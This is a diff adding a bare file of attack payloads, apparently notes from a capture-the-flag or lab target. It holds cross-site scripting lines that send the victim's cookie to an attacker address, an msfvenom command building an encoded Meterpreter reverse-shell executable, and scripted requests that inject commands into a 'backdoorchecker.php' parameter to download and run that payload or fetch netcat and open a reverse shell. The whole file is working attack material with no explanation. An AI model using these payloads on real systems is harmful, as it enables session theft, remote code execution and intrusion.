@@ -1,0 +1,28 @@
+
+<script src='http://10.10.16.77:80/xss.php?cookie='+document.cookie;></script>
+
+<script>location.href='http://10.10.16.77:80/xss.php?cookie='+document.cookie;></script>
+
+<script>new Image().src="http://10.10.16.77:80/"+btoa(document.cookie);</script>
+
+
+Create payload
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.191 LPORT=9003 -e x64/xor -f exe -o yolo.exe
+
+Download payload
+<script> x=new XMLHttpRequest(); params='cmd=dir|powershell iwr http://10.10.16.77:80/yolo.exe -outfile C:/ProgramData/yolo.exe;';
+x.open('POST','http://localhost/admin/backdoorchecker.php',true); x.setRequestHeader('Content -type','application/x-www-form-urlencoded'); x.onload=function()
+{document.write(this.responseText)}; x.send(params); </script>
+
+Request payload
+<script> x=new XMLHttpRequest(); params='cmd=dir|cmd /c C:/ProgramData/yolo.exe;'; x.open("POST","http://localhost/admin/back doorchecker.php",true);
+x.setRequestHeader('Content-type','application/x-www-form-urlencoded'); x.onload=function(){document.write(this.responseText)}; x.send(params); </script>
+
+
+
+
+------
+
+<script>var http = new XMLHttpRequest();var url='http://localhost/admin/backdoorchecker.php';var params='cmd=dir| powershell -c "iwr -uri http://10.10.16.77:80/nc.exe -outfile %temp%\\mync.exe";%temp%\\mync.exe -e cmd.exe 10.10.16.77 1337';http.open('POST',url,true);http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');http.send(params);</script>
+
+
